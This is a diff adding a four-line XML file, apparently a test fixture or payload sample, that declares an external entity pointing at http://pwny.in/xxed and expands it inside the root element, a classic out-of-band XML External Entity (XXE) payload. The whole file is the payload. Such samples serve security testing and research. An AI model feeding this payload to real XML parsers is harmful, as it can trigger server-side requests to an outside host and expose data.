@@ -1,0 +1,4 @@
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://pwny.in/xxed">
+]>
+<root>&xxe;</root>
